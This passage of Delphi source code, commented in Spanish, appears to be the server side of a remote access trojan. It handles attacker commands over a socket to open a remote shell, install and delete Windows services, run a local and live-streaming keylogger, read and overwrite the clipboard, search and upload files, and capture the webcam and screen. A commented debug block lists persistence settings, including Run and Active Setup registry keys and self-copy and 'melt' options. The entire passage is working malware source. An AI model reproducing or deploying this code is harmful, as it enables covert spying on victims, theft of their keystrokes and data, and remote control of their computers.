              IntToStr(SH), LocalFilePath, 'SENDFILE', 0);
            ThreadInfo.RemoteFileName := FilePath;
            ThreadInfo.UploadSize := StrToInt(Recibido);
            ThreadInfo.Hash := Tempstr;
            //ThreadedTransfer(Pointer(ThreadInfo)); //Para debug
            //exit; //Para debug junto a la linea anterior
            BeginThread(nil,
              0,
              Addr(ThreadedTransfer),
              ThreadInfo,
              0,
              ThreadInfo.ThreadId);
          end;

          if Pos('SHELL|', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 6);
            if Recibido = 'ACTIVAR' then
            begin
              ShellParameters.Cliente := sock;
              if ShellThreadID = 0 then
              begin
                CreateThread(nil, 0, @ShellThread, @ShellParameters, 0, ShellThreadID);
                sock.SendString('SHELL|ACTIVAR' + ENTER);
              end;
            end
            else
            if Recibido = 'DESACTIVAR' then
            begin
              if ShellThreadID <> 0 then
                PostThreadMessage(ShellThreadID, WM_ACTIVATE, Length('exit'),
                  DWord(PChar('exit')));
            end
            else
            begin
              //Entonces es un comando para escribirle a la shell
              TempStr := '';
              Tempstr := Recibido;
              if ShellThreadID <> 0 then
                PostThreadMessage(ShellThreadID, WM_ACTIVATE, length(Tempstr),
                  DWord(PChar(Tempstr)));
            end;

          end; //if Pos('Shell', recibido) = 1

          if Recibido = 'LISTARSERVICIOS' then
          begin
            Tempstr := '';
            Tempstr := ServiceList;
            SendText('SERVICIOSWIN' + '|' + TempStr + ENTER);
          end;
          
          if Pos('INICIARSERVICIO', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 15);
            ServiceStatus(Recibido, True, True);
            SendText('MSG|{47}' + ENTER);
          end;

          if Pos('DETENERSERVICIO', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 15);
            ServiceStatus(Recibido, True, False);
            SendText('MSG|{48}' + ENTER);
          end;

          if Pos('BORRARSERVICIO', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 14);
            ServicioBorrar(Recibido);
            SendText('MSG|{49}' + ENTER);
          end;

          if Pos('INSTALARSERVICIO', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 16);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            //prueba//messageBox(0,pchar(tempstr+'|'+tempstr1+'|'+tempstr2),0,0);
            ServicioCrear(TempStr, TempStr1, TempStr2);
            SendText('MSG|{50}' + ENTER);
          end;

          if Recibido = 'ESTADOKEYLOGGER' then //Informa al cliente sobre el estado del keylogger y del archivo del log
            SendText('ESTADOKEYLOGGER|'+BooleanToStr(ObtenerEstadoKeylogger, 'ACTIVADO', 'DESACTIVADO')+'|'+GetKeyloggerPath+'|'+ENTER);

          if Pos('ACTIVARKEYLOGGER', Recibido) = 1 then //ACTIVARKEYLOGGER|NOMBREFILELOG|
          begin
            Delete(Recibido, 1, 17);
            Tempstr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            EmpezarKeylogger(TempStr);
            SendText('ESTADOKEYLOGGER|ACTIVADO|'+GetKeyloggerPath+'|'+ENTER);
          end;

          if Pos('DESACTIVARKEYLOGGER', Recibido) = 1 then
          begin
            PararKeylogger();
            SendText('ESTADOKEYLOGGER|DESACTIVADO|'+GetKeyloggerPath+'|'+ENTER);
          end;

          if Pos('ELIMINARLOGKEYLOGGER', Recibido) = 1 then //eLiminar el log del keylogger
          begin
             SendText('MSG|{51}' + ENTER);
             EliminarLog();
          end;

          if Pos('ONLINEKEYLOGGER', Recibido) = 1 then //Activa o desactiva el online keylogger
          begin
            Delete(Recibido, 1, 16);
            if(Copy(Recibido, 1, Pos('|', Recibido) - 1)='ACTIVAR') then
            begin
              SendText('MSG|{52}' + ENTER);
              SetOnlineKeylogger(true,sock);
            end
            else
            begin
              SendText('MSG|{53}' + ENTER);
              SetOnlineKeylogger(false,nil);
            end;
          end;

          //Buscar archivos y carpetas
          if Copy(Recibido, 1, 11) = 'STARTSEARCH' then
          begin
            Delete(Recibido, 1, 12);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) -1 );

            ThreadSearch := TThreadSearch.Create(sock,tempstr);
            BeginThread(nil,
              0,
              Addr(threadstart),
              ThreadSearch,
              0,
              ThreadSearch.ThreadId);
          end;

          if Copy(Recibido, 1, 10) = 'STOPSEARCH' then
          begin
            StopSearch := true; //Se le manda al thread que finalice, él se encarga de informar al cliente si acabó
          end;

          // Clipboard (basado en el codigo de The Swash)
          if Pos('GETCLIP', Recibido) = 1 then
          begin
            Delete(Recibido,1,7);
            Tempstr := '';
            Tempstr := GetClipBoardDatas;
            //Tenemos que eliminar los #10 y #13 para que todo  se mande en una sola línea
            TempStr := StringReplace(Trim(TempStr),#10, '|salto|', [rfReplaceAll]);
            TempStr := StringReplace((TempStr),#13, '|salto2|', [rfReplaceAll]);
            SendText('GETCLIP|' + TempStr + ENTER);
          end;

          if Pos('SETCLIP', Recibido) = 1 then
          begin
            Delete(Recibido,1,8);
            //Cambiamos los |saltos| por saltos de línea
            TempStr := '';
            TempStr := Recibido;
            TempStr := StringReplace(Trim(TempStr),'|salto|', #10, [rfReplaceAll]);
            TempStr := StringReplace((TempStr),'|salto2|', #13, [rfReplaceAll]);
            SetClipBoardDatas( PChar(TempStr) );
			      SendText('MSG|{54}' + ENTER);
          end;

          if Pos('GETADRIVERS', Recibido) = 1 then
          begin
            Tempstr := '';
            TempStr := DispositivosDeAudio;
            sendtext('GETADRIVERS|'+Tempstr+ENTER);
          end;

          lastCommandTime := getTickCount;
          Busy := False;
        end;//while sock.connected do

          //Estamos desconectados así que tenemos que desactivar la webcam y el online keylogger
          //La shell se desactiva automaticamente
          SetOnlineKeylogger(false,nil); //Desactivamos online keylogger
          CapturaWebcam := '';
          CapturaPantalla := '';
          CapturaThumb := '';
          CapturaKeylogger := '';
          pararcapturathread := true;
          DesactivarWebcams(); //Desactivamos las webcams para que las pueda usar normalmente
      end//try                                                           
    except
      begin
        if sock <> nil then
        begin
          if sock.Connected then
            sock.Disconnect;
          sock.Free;
          sock := nil;
          Exit;
        end;//if sock <> nil
      end//except
    end;//fin try/except block
  end;//Fin del OnRead del socket

  procedure CargarServidor(P:Pointer);
  begin
    Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
    VersionDelServer := '1.3';
    BeginThread(nil,0,Addr(KeepAliveThread),nil,0,id1);
    OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
  
    while True do
    begin
      iniciar();
      sleep(1000 * 10); //Duermo 10 seg antes de conectar de nuevo
    end;
  end;

  exports CargarServidor;

begin
    //Para debug:
    {Configuracion.sHosts                 := 'localhost:77¬';
    Configuracion.sID                     := 'Coolserver';
    Configuracion.bCopiarArchivo          := False; //Me copio o no?
    Configuracion.sFileNameToCopy         := 'coolserver.exe';
    Configuracion.sCopyTo                 := 'C:\';
    Configuracion.bCopiarConFechaAnterior := False;
    Configuracion.bMelt                   := False;
    Configuracion.bArranqueRun            := False;
    Configuracion.sRunRegKeyName          := 'Coolserver';
    Configuracion.bArranqueActiveSetup    := False;
    Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
    CargarServidor(@configuracion);  
    }//Fin de Para debug
end.
